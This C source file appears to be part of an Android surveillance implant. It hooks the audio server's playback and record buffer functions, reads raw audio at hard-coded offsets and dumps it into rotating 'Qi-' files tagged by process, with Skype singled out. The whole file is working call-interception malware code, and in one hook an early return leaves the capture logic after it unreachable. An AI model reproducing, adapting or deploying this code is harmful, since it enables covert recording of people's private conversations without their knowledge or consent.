void* playbackTrack_threadLoop_write(void* this, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void* result;
  unsigned int* cblk_ptr;
  unsigned int cblk;
  unsigned long framesAvail;
  unsigned long bufferSize;
  unsigned long bufferStart;
  unsigned long thisStart;
  unsigned long bufferEndAddress;
  unsigned int sampleRate;
  struct timeval tv;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;

  char timestamp[11];  // epoch %ld 10 + null;
  char pidC[11];  // pid %d 10 + null;
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;






  /* call the original function */
  h_ptr = (void *) playbackTrack_threadLoop_write_helper.orig;
  helper_precall(&playbackTrack_threadLoop_write_helper);
  result = h_ptr( this,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrack_threadLoop_write_helper);
  unsigned int  mMixBuffer = * (unsigned int*) (this + 0xdc);
#ifdef DEBUG_HOOKFNC
  log("playbackTrack_threadLoop_write:HOOKED \n");
#endif
  return result;
  framesCount = * (unsigned int*) (b + 4);
  /* fetch the necessary fields */
  cblk_ptr = (unsigned int*) (this + mCblk_this_offset) ;
  cblk = *cblk_ptr;

  frameSize = *(unsigned char *) (this + 0x40 );




  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);


  /* [1] first field (ptr) within mMixBuffer */
  bufferRaw = *(unsigned int*) (b);


  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  //log("start hash find\n");
  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);


  if( cblk_tmp != NULL ) {

    if( result == 0 && framesCount != 0 && cblk_tmp->streamType == 0 ) {

      headerStart = lseek(cblk_tmp->fd, 0, SEEK_CUR);

      uintTmp = 0xb00bb00b;
      write(cblk_tmp->fd, &uintTmp, 4); // 1] epoch start
      //write(cblk_tmp->fd, &uintTmp, 4); // 2] epoch end
      write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType
      write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate
      write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block


      res = write(cblk_tmp->fd, bufferRaw, framesCount * frameSize  );
#ifdef DEBUG_HOOKFNC
      //log("wrote: %d - expected: %d frameCount=%d frameSize=%d \n", res, framesCount * frameSize ,framesCount , frameSize);
#endif
      positionTmp = lseek(cblk_tmp->fd, 0, SEEK_CUR);


      // if something is written fix the header
      if( res > 0 ) {
        // go back to start of header
        lseek(cblk_tmp->fd, headerStart, SEEK_SET);

        // write the header
        now = time(NULL);
        //tt = gettimeofday(&tv,NULL);
        written = write(cblk_tmp->fd, &now , 4); // 1] timestamp start
        //written = write(cblk_tmp->fd, &now , 4); // 2] timestamp end - fake value
        written = write(cblk_tmp->fd, &cblk_tmp->streamType , 4); // 3] streamType
        written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 4] sampleRate
        written = write(cblk_tmp->fd, &res , 4); // 5] res
        if(res!=(framesCount * frameSize)){
#ifdef DEBUG_HOOKFNC
          log("write less then expexted %d write %d \n", (framesCount * frameSize),res);
          //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
          if(frameSize)
            framesCount = res/frameSize;
        }

        // reposition the fd
        lseek(cblk_tmp->fd, positionTmp, SEEK_SET);

        /* dump when fd is at position >= 1048576 - 1Mb */
        if(lseek(cblk_tmp->fd, 0, SEEK_CUR) >= FILESIZE) {

          /* rename file *.bin to *.tmp */
          filename = strdup(cblk_tmp->filename); // check return value
          *(filename+strlen(filename)-1) = 'p';
          *(filename+strlen(filename)-2) = 'm';
          *(filename+strlen(filename)-3) = 't';

#ifdef DEBUG_HOOKFNC
          log("DUMPING fname %s\n", filename);
          //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
          rename(cblk_tmp->filename, filename);

          if( filename != NULL)  {
            free(filename);
          }

          close(cblk_tmp->fd);
          cblk_tmp->fd = -1;

          /* generate a new filename for the track */
          snprintf(timestamp,  11, "%d", time(NULL));
          snprintf(pidC,  11, "%d", cblk_tmp->pid);
          filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 +1 + strlen(pidC);

          cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
          snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, cblk_tmp->trackId,pidC );


          cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);

#ifdef DEBUG_HOOKFNC
          log("%s fd: %d continuing open%s\n", cblk_tmp->filename, cblk_tmp->fd,(cblk_tmp->fd>1)?"OK":"Failed");
#endif

        }else{
#ifdef DEBUG_HOOKFNC
          //log("adding data track cblk %p, result=%d dataSize=%d streamType=%d pid=%d \n",
              //cblk,result,framesCount * frameSize,cblk_tmp->streamType,cblk_tmp->pid);
#endif
        }

      }else {
        // otherwise remove the header, we don't need this block
        lseek(cblk_tmp->fd, headerStart, SEEK_SET);
#ifdef DEBUG_HOOKFNC
        log("skipping this buffer block cblk %p nothing has been written to fd %d framesCount=%d frameSize=%d \n",
            cblk,cblk_tmp->fd,framesCount,frameSize);
#endif

      }

    }else{
#ifdef DEBUG_HOOKFNC
      //log("skipping track cblk %p, result=%d frameCount=%d streamType=%d pid=%d \n",
          //cblk,result,framesCount,cblk_tmp->streamType,cblk_tmp->pid);
#endif
    }


    /* in both cases update cblk_tmp for the next run  */
    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;
  }else {
#ifdef DEBUG_HOOKFNC
    //log("cblk not found %x\n", cblk);
#endif
  }

#ifdef DEBUG_HOOKFNC
  //  log("\t\t\t------- end playback3 -------------\n");
#endif

  return result;

}
void* playbackTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void* result;
  unsigned int* cblk_ptr;
  unsigned int cblk;
  unsigned long framesAvail;
  unsigned long bufferSize;
  unsigned long bufferStart;
  unsigned long thisStart;
  unsigned long bufferEndAddress;
  unsigned int sampleRate;
  struct timeval tv;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;

  char timestamp[11];  // epoch %ld 10 + null;
  char pidC[11];  // pid %d 10 + null;
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- playback3 -------------\n");
#endif

  /* if( cblk_tmp->fd == 0) { */
  /*   cblk_tmp->fd = open("/data/local/tmp/log_out" , O_RDWR , S_IRUSR | S_IRGRP | S_IROTH); */
  /* } */

  // tmp
  framesCount = * (unsigned int*) (b + 4);

#ifdef DEBUG_HOOKFNC
//  log("> pb args %x %x %x - desiredFrames: %x\n", a, b, c, framesCount);
#endif

  /* call the original function */
  h_ptr = (void *) playbackTrack_getNextBuffer_helper.orig;
  helper_precall(&playbackTrack_getNextBuffer_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrack_getNextBuffer_helper);
  if(result!=NULL)
    return result;
#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif


  /* fetch the necessary fields */
  cblk_ptr = (unsigned int*) (a + mCblk_this_offset) ;
  cblk = *cblk_ptr;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk %p\n", cblk);
#endif

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk flags %x\n", *(signed int*) (cblk + 0x3c));
#endif

  /* [3] */

  //android 4.3 (gdb) p/x (int)&(('android::AudioFlinger::PlaybackThread::Track'*)0)->mFrameSize
  //$29 = 0x40
  if (android_version_ID >= ANDROID_V_4_3)
    frameSize = *(unsigned char *) (a + 0x40 );
  else
    frameSize = *(unsigned char *) (cblk + 0x34 );
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframeSize %x\n", frameSize);
#endif

  // not really useful, info only
  sampleRate = *(unsigned int*) (cblk + 0x30);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tsampleRate %d\n", sampleRate);
#endif


  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframesCount %x\n", framesCount);
#endif

  /* [1] first field (ptr) within AudioBufferProvider */
  bufferRaw = *(unsigned int*) (b);


  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  //log("start hash find\n");
  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);


  if( cblk_tmp != NULL ) {

    if( result == 0 && framesCount != 0 && cblk_tmp->streamType == 0 && (local_started || (cblk_tmp->pid!=PRG_SKYPE_ID))) {
      if(cblk_tmp->filename == NULL ){
        snprintf(timestamp,  11, "%d", time(NULL));
        snprintf(pidC,  11, "%d", cblk_tmp->pid);
        filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId ) + 1 + 4 + 1 + 3+1+strlen(pidC);

        cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
        snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp,  cblk_tmp->trackId ,pidC );


#ifdef DEBUG_HOOKFNC
        if(cblk_tmp->pid==PRG_MEDIASERVER_ID)
          log("trackId: %s owned by mediaserver ", cblk_tmp->trackId);
#endif

        cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
        log("filename: %s open %s sampleRate %d", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED",sampleRate);
#endif
      }
      if(cblk_tmp->fd != -1){
        /*
       off_t lseek(int fd, off_t offset, int whence);
DESCRIPTION
       The lseek() function repositions the offset of the open file associated with the file descriptor fd to the argument offset according to the directive whence as follows:
       SEEK_SET
              The offset is set to offset bytes.
       SEEK_CUR
              The offset is set to its current location plus offset bytes.
       SEEK_END
              The offset is set to the size of the file plus offset bytes.

       RETURN Upon successful completion, lseek() returns the resulting offset location as measured in bytes from the beginning of the file
         */
        // header
        headerStart = lseek(cblk_tmp->fd, 0, SEEK_CUR);
        //log("\t\theaderStart: %x\n", headerStart);

        // epoch : streamType : sampleRate : blockLen

        uintTmp = 0xb00bb00b;
        write(cblk_tmp->fd, &uintTmp, 4); // 1] epoch start
        //write(cblk_tmp->fd, &uintTmp, 4); // 2] epoch end
        write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType
        write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate
        write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block

#ifdef DEBUG_HOOKFNC
        //  log("\t\t\tbuffer spans: %p -> %p\n", bufferRaw, (bufferRaw + framesCount * frameSize ) );
#endif
        res = write(cblk_tmp->fd, bufferRaw, framesCount * frameSize  );
#ifdef DEBUG_HOOKFNC
        //log("wrote: %d - expected: %d in %s \n", res, framesCount * frameSize ,cblk_tmp->filename);
#endif
        positionTmp = lseek(cblk_tmp->fd, 0, SEEK_CUR);

#ifdef DEBUG_HOOKFNC
        //   log("\t\tfake header written: %x\n", positionTmp);
#endif

        // if something is written fix the header
        if( res > 0 ) {
          // go back to start of header
          lseek(cblk_tmp->fd, headerStart, SEEK_SET);

#ifdef DEBUG_HOOKFNC
          //log("\t\trolled back: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));
#endif

          // write the header
          now = time(NULL);
          //tt = gettimeofday(&tv,NULL);
          written = write(cblk_tmp->fd, &now , 4); // 1] timestamp start
          //written = write(cblk_tmp->fd, &now , 4); // 2] timestamp end - fake value
          written = write(cblk_tmp->fd, &cblk_tmp->streamType , 4); // 3] streamType
          written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 4] sampleRate
          written = write(cblk_tmp->fd, &res , 4); // 5] res
#ifdef DEBUG_HOOKFNC
          //	log("\t\t\theader fixed %x -> %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, cblk_tmp->sampleRate, res);
#endif

          // reposition the fd
          lseek(cblk_tmp->fd, positionTmp, SEEK_SET);

#ifdef DEBUG_HOOKFNC
          //	log("\t\trolled forward: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));
#endif

          /* dump when fd is at position >= 1048576 - 1Mb */
          if(lseek(cblk_tmp->fd, 0, SEEK_CUR) >= FILESIZE) {

#ifdef DEBUG_HOOKFNC
            //	  log("should take a dump\n");
#endif

            /* rename file *.bin to *.tmp */
            filename = strdup(cblk_tmp->filename); // check return value
            *(filename+strlen(filename)-1) = 'p';
            *(filename+strlen(filename)-2) = 'm';
            *(filename+strlen(filename)-3) = 't';

#ifdef DEBUG_HOOKFNC
            log("DUMPING fname %s\n", filename);
            //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
            rename(cblk_tmp->filename, filename);

            if( filename != NULL)  {
              free(filename);
            }

            close(cblk_tmp->fd);
            cblk_tmp->fd = -1;
            /* generate a new filename for the track */
            snprintf(timestamp,  11, "%d", time(NULL));
            snprintf(pidC,  11, "%d", cblk_tmp->pid);
            filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 +1 + strlen(pidC);

            cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
            snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, cblk_tmp->trackId,pidC );

#ifdef DEBUG_HOOKFNC
            //	  log("new filename: %s\n", cblk_tmp->filename);
#endif

            cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);

#ifdef DEBUG_HOOKFNC
            log("%s fd: %d continuing open%s\n", cblk_tmp->filename, cblk_tmp->fd,(cblk_tmp->fd>1)?"OK":"Failed");
#endif

          }
        }else {
          // otherwise remove the header, we don't need this block
          lseek(cblk_tmp->fd, headerStart, SEEK_SET);


        }
      }
    }else{
#ifdef DEBUG_HOOKFNC
      //log("skipping track cblk %p, result=%d frameCount=%d streamType=%d pid=%d \n",
          //cblk,result,framesCount,cblk_tmp->streamType,cblk_tmp->pid);
#endif
    }


    /* in both cases update cblk_tmp for the next run  */
    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;
  }else {
#ifdef DEBUG_HOOKFNC
    //log("cblk not found %x\n", cblk);
#endif
  }

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- end playback3 -------------\n");
#endif

  return result;

}



void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void* result;
  unsigned int* cblk_ptr;
  unsigned int cblk;
  unsigned long framesAvail;
  unsigned long bufferSize;
  unsigned long bufferStart;
  unsigned long thisStart;
  unsigned long bufferEndAddress;
  unsigned int sampleRate;
  struct timeval tv;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;
  char pidC[11]; // pid %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- record3 -------------\n");
#endif

  // tmp
  framesCount = * (unsigned int*) (b + 4);

#ifdef DEBUG_HOOKFNC
//  log("> rt args %x %x %x - desiredFrames: %x \n", a, b, c, framesCount);
#endif



  /* call the original function */
  h_ptr = (void *) recordTrack_getNextBuffer_helper.orig;
  helper_precall(&recordTrack_getNextBuffer_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&recordTrack_getNextBuffer_helper);
  if(result!=NULL)
      return result;
#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif


  /* fetch the necessary fields */
  cblk_ptr = (unsigned int*) (a + mCblk_this_offset) ;
  cblk = *cblk_ptr;
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk %p\n", cblk);
#endif

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk flags %x\n", *(signed int*) (cblk + 0x3c));
#endif

  /* [3] */
  if (android_version_ID >= ANDROID_V_4_3)
    frameSize = *(unsigned char *) (a + 0x40 );
  else
    frameSize = *(unsigned char *) (cblk + 0x34 );
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframeSize %x\n", frameSize);
#endif

  // not really useful, info only
  if (android_version_ID >= ANDROID_V_4_3){
    sampleRate = *(unsigned int*) (a + 0x30);
  }else{
    sampleRate = *(unsigned int*) (cblk + 0x30);
  }
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tsampleRate %x\n", sampleRate);
#endif

  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframesCount %x\n", framesCount);
#endif

  /* [1] first field (ptr) within AudioBufferProvider */
  bufferRaw = *(unsigned int*) (b);
    unsigned long mClient;
    mClient = *(unsigned long*) (a + mClient_thisP_offset);
    int pid = *(int*) (mClient + mPid_mClient_offset );
  #ifdef DEBUG_HOOKFNC
//  log("\tnew track cblk: %p calling pid=%d trackId: %s\n", cblk,pid,cblk_tmp->trackId);
  #endif
    if(pid>0){
    	int tmp=0;
    	tmp=get_command_id(pid);
#ifdef DEBUG_HOOKFNC
    	if(tmp<=0){
    		//log("pid %d not found\n",pid);
    	}
#endif
    	pid=tmp;
     }else{
   	  pid=0;
     }
if( pid>PRG_MEDIASERVER_ID ) {
  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  HASH_FIND_INT( cblkRecordTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL && cblk_tmp->lastStatus == STATUS_STOP){
    //this is here because of the old call, FREE IT!!!
    if(cblk_tmp->fd != -1)
      close(cblk_tmp->fd);
    cblk_tmp->fd = -1;
    if( cblk_tmp->filename != NULL ) {
#ifdef DEBUG_HOOKFNC
        log("FREEING LEFTOVER: %s", cblk_tmp->filename);
#endif
      free(cblk_tmp->filename);
      cblk_tmp->filename = NULL;
    }else{
#ifdef DEBUG_HOOKFNC
        log("FREEING LEFTOVER: for %p", cblk);
#endif
    }
    if( cblk_tmp->trackId != NULL ) {
      free(cblk_tmp->trackId);
      cblk_tmp->trackId = NULL;
    }
    HASH_DEL(cblkRecordTracks, cblk_tmp);
    free(cblk_tmp);
    cblk_tmp =NULL;
  }

  if( cblk_tmp == NULL ) {

    /* old code: insert from getBuffer  if( cblk_tmp != NULL ) { */

    cblk_tmp =  malloc( sizeof(struct cblk_t) );
    cblk_tmp->filename=NULL;
#ifdef DEBUG_HOOKFNC
 //   log("cblk_tmp %x size %d\n", cblk_tmp, sizeof(cblk_tmp));
#endif

    cblk_tmp->cblk_index = cblk;

    /*
       record does not have a corresponding newTrack event
       for such reason possible status are start or stop only
     */
    cblk_tmp->lastStatus = STATUS_START;


    snprintf(randString, 11, "%lu", mrand48());
    snprintf(timestamp,  11, "%d", time(NULL));

    cblk_tmp->trackId = strdup(randString);

#ifdef DEBUG_HOOKFNC
   // log("trackId: %s\n", cblk_tmp->trackId);
#endif


    //         Qi-<timestamp>-<id univoco per chiamata>-<canale>-<pid>.[tmp|boh]
    // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
    // filenameLength including null
    snprintf(pidC, 11, "%d", pid);
    filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3 + 1 + strlen(pidC);

    cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
    snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-l.bin",dumpPath, timestamp, randString,pidC );

#ifdef DEBUG_HOOKFNC
//    log("filename: %s\n", cblk_tmp->filename);
#endif


    cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);

#ifdef DEBUG_HOOKFNC
    log("%s fd: %d\n", cblk_tmp->filename, cblk_tmp->fd);
#endif



    cblk_tmp->frameCount = *(unsigned int*) (cblk + 0x1c);

#ifdef DEBUG_HOOKFNC
//    log("frame count: %x\nframe size %d\nbuffer end: %x\n", cblk_tmp->frameCount, frameSize,  (cblk_tmp->frameCount * frameSize));
#endif

    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;

    cblk_tmp->streamType = -2; // dummy value, we can't tell from within getNextBuffer the exact streamType
    cblk_tmp->sampleRate = sampleRate;
    cblk_tmp->pid=pid;
    // temporary fix for 2 stop call in a row
    cblk_tmp->stopDump = 0;

    HASH_ADD_INT(cblkRecordTracks, cblk_index, cblk_tmp); // record
    cblk_tmp = NULL;

    HASH_FIND_INT( cblkRecordTracks, &cblk, cblk_tmp);

    if( cblk_tmp == NULL ) {
#ifdef DEBUG_HOOKFNC
      log("uthash shit happened\n");
#endif
      return result;
    }
#ifdef DEBUG_HOOKFNC
    log("\t\tgetNextBuffer added cblk\n");
#endif
    local_started=1;
  }else {

#ifdef DEBUG_HOOKFNC
//    log("\t\tstreamType: %d\n", cblk_tmp->streamType);
#endif

#ifdef DEBUG_HOOKFNC
    //TODO: temporary
    if( cblk_tmp->stopDump == 1)
      log("RECEVING MORE DATA FOR TRACK %p\n", cblk);
#endif

    if( result == 0 && framesCount != 0 && cblk_tmp->stopDump == 0 ) { // stopDump: temporary fix

      // header
      headerStart = lseek(cblk_tmp->fd, 0, SEEK_CUR);
      //log("\t\theaderStart: %x\n", headerStart);

      // epoch : streamType : sampleRate : blockLen

      uintTmp = 0xc00cc00c;
      write(cblk_tmp->fd, &uintTmp, 4); // 1] epoch
      write(cblk_tmp->fd, &uintTmp, 4); // 2] streamType
      write(cblk_tmp->fd, &uintTmp, 4); // 3] sampleRate
      write(cblk_tmp->fd, &uintTmp, 4); // 4] size of block

#ifdef DEBUG_HOOKFNC
 //     log("\t\t\tbuffer spans: %p -> %p\n", bufferRaw, (bufferRaw + framesCount * frameSize ) );
#endif
      res = write(cblk_tmp->fd, bufferRaw, framesCount * frameSize  );
#ifdef DEBUG_HOOKFNC
 //     log("\t\t\t\twrote: %d - expected: %d\n", res, framesCount * frameSize );
#endif
      positionTmp = lseek(cblk_tmp->fd, 0, SEEK_CUR);

#ifdef DEBUG_HOOKFNC
//      log("\t\tfake header written: %x\n", positionTmp);
#endif

      // if something is written fix the header
      if( res > 0 ) {
	// go back to start of header
	lseek(cblk_tmp->fd, headerStart, SEEK_SET);

#ifdef DEBUG_HOOKFNC
//	log("\t\trolled back: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));
#endif

	// write the header
	now = time(NULL);
	//tt = gettimeofday(&tv,NULL);
	written = write(cblk_tmp->fd, &now , 4); // 1] timestamp
	written = write(cblk_tmp->fd, &cblk_tmp->streamType , 4); // 2] streamType
	written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 3] sampleRate
	written = write(cblk_tmp->fd, &res , 4); // 4] res

  if(res!=(framesCount * frameSize)){
#ifdef DEBUG_HOOKFNC
    log("write less then expexted %d write %d \n", (framesCount * frameSize),res);
    //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
    if(frameSize)
      framesCount = res/frameSize;
  }
#ifdef DEBUG_HOOKFNC
//	log("\t\t\theader fixed %x -> %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, cblk_tmp->sampleRate, res);
#endif

	// reposition the fd
	lseek(cblk_tmp->fd, positionTmp, SEEK_SET);
	//log("\t\trolled forward: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));


	/* dump when fd is at position >= 5242880 */
	if( lseek(cblk_tmp->fd, 0, SEEK_CUR) >= FILESIZE ) {



	  /* rename file *.bin to *.tmp */
	  filename = strdup(cblk_tmp->filename); // check return value
	  *(filename+strlen(filename)-1) = 'p';
	  *(filename+strlen(filename)-2) = 'm';
	  *(filename+strlen(filename)-3) = 't';

#ifdef DEBUG_HOOKFNC
    log("dumping %s\n",filename);
#endif
#ifdef DEBUG_HOOKFNC
//	  log("fname %s\n", filename);
	  //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
	  rename(cblk_tmp->filename, filename);

	  if( filename != NULL)  {
#ifdef DEBUG_HOOKFNC
//	    log("freeing filename\n");
#endif
	    free(filename);
#ifdef DEBUG_HOOKFNC
//	    log("after filename free\n");
#endif
	  }

	  close(cblk_tmp->fd);
    cblk_tmp->fd = -1;
	  /* generate a new filename for the track */
	  snprintf(timestamp,  11, "%d", time(NULL));
	  cblk_tmp->pid=pid;
	  snprintf(pidC,  11, "%d", cblk_tmp->pid);

	  filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 + 1 + strlen(pidC);

	  cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
	  snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-l.bin", dumpPath, timestamp, cblk_tmp->trackId,pidC );

#ifdef DEBUG_HOOKFNC
	  log("new filename: %s\n", cblk_tmp->filename);
#endif

	  cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
//	  log("%s fd: %d\n", cblk_tmp->filename, cblk_tmp->fd);
#endif

	}

      }
      // otherwise remove the header, we don't need this block
      else {
	lseek(cblk_tmp->fd, headerStart, SEEK_SET);
      }

    }

    /* in both cases update cblk_tmp for the next run  */
    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;

  }
}else{
#ifdef DEBUG_HOOKFNC
    log("pid unknown %d\n",pid);
#endif
}

#ifdef DEBUG_HOOKFNC
 // log("\t\t\t------- end record3 -------------\n");
#endif


  return result;

}
